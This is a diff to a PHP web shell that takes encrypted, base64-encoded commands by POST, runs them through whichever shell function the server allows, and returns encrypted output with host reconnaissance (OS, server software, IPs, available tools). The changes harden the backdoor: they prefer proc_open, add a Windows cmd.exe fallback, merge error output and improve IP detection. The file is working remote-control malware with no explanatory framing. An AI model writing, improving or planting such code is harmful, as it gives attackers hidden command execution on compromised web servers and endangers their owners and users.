@@ -33,7 +33,14 @@ if (isset($_POST['i'])) {
             $owner_uid = posix_getpwuid(posix_geteuid());
             $owner     = $owner_uid['name'];
         } else {
-            $owner = getenv('USERNAME');
+            $owner = get_current_user();
+        }
+
+        $ip = "";
+        if(isset($_SERVER['SERVER_ADDR'])){
+            $ip = $_SERVER['SERVER_ADDR'];
+        } else {
+            $ip = $_SERVER['SERVER_NAME'];
         }
 
         $output = json_encode(array(
@@ -44,10 +51,11 @@ if (isset($_POST['i'])) {
             'os' => base64_encode(php_uname()),
             'server' => base64_encode($_SERVER['SERVER_SOFTWARE']),
             'time' => base64_encode(date('l jS F Y h:i:s A')),
-            'ip' => base64_encode(getenv('SERVER_ADDR')),
+            'ip' => base64_encode($ip),
             'client_ip' => base64_encode(get_client_ip()),
             'tools' => base64_encode(implode('|', find_tools()))
         ));
+
         echo encrypt_decrypt('encrypt', $output, $key, $iv);
     }
 
@@ -65,6 +73,7 @@ $output    = '';
 $downloads = array();
 
 $path = realpath(base64_decode($_POST['p']));
+chdir($path);
 if (isset($_POST['c'])) {
     // Receiving the command
     $cmd = base64_decode(encrypt_decrypt('decrypt', $_POST['c'], $key, $iv));
@@ -76,12 +85,13 @@ if (isset($_POST['c'])) {
             $user = posix_getpwuid(posix_getuid());
             $dir  = $user['dir'];
         }
-        $dir = realpath($dir);
-        chdir($dir);
+        $path = realpath($dir);
+        if(is_dir($path)){
+            chdir($path);
+        }
     } else {
         // Let's run the action
         if (strlen($cmd) > 0) {
-            chdir($path);
             $output = execute_command($cmd);
         }
     }
@@ -170,16 +180,16 @@ function get_shell_command()
 {
     $shell_command = null;
     if ($shell_command === null) {
-        if (is_function_available('system')) {
-            $shell_command = 'system';
+        if (is_function_available('proc_open')) {
+            $shell_command = 'proc_open';
         } elseif (is_function_available('shell_exec')) {
             $shell_command = 'shell_exec';
         } elseif (is_function_available('exec')) {
             $shell_command = 'exec';
         } elseif (is_function_available('passthru')) {
             $shell_command = 'passthru';
-        } elseif (is_function_available('proc_open')) {
-            $shell_command = 'proc_open';
+        } elseif (is_function_available('system')) {
+            $shell_command = 'system';
         } elseif (is_function_available('popen')) {
             $shell_command = 'popen';
         }
@@ -189,9 +199,11 @@ function get_shell_command()
 }
 
 // Run, baby!
-function execute_command($command)
+function execute_command($command, $win_trick = true)
 {
-    $command .= ' 2>&1';
+    if (DIRECTORY_SEPARATOR === '/') {
+        $command .= ' 2>&1';
+    }
     switch (get_shell_command()) {
         case 'system':
             ob_start();
@@ -225,13 +237,35 @@ function execute_command($command)
                     'w'
                 )
             );
-            $process     = proc_open($command, $descriptors, $pipes, getcwd());
-            fclose($pipes[0]);
-            $output = stream_get_contents($pipes[1]);
-            fclose($pipes[1]);
-            $error = stream_get_contents($pipes[2]);
-            fclose($pipes[2]);
-            $code = proc_close($process);
+            if (DIRECTORY_SEPARATOR === '\\') {
+                $old_trick = $command;
+                if ($win_trick){
+                    $old_trick = "C:\\Windows\\System32\\cmd.exe /C {$command}";
+                }
+                $process = @proc_open($old_trick, $descriptors, $pipes, getcwd(), null, array(
+                    'suppress_errors' => false,
+                    'bypass_shell' => true
+                ));
+                if(!is_resource($process)){
+                    $old_trick = $command;
+                    $process = @proc_open($old_trick, $descriptors, $pipes, getcwd(), null, array(
+                        'suppress_errors' => false,
+                        'bypass_shell' => true
+                    ));
+                }
+            } else {
+                $process = proc_open($command , $descriptors, $pipes, getcwd());
+            }
+            $output = "";
+            if(is_resource($process)){
+                fclose($pipes[0]);
+                $output = stream_get_contents($pipes[1]);
+                fclose($pipes[1]);
+                $error = stream_get_contents($pipes[2]);
+                $output .= $error;
+                fclose($pipes[2]);
+                $code = proc_close($process);
+            }
             return $output;
         case 'popen':
             $process = popen($command, 'r');
@@ -314,7 +348,7 @@ function find_tools()
 
     if (!empty($command)) {
         foreach ($tools as $tool) {
-            $output = execute_command("{$command} {$tool}");
+            $output = execute_command("{$command} {$tool}", false);
             if (strlen(trim($output)) > 0) {
                 array_push($found, $tool);
             }
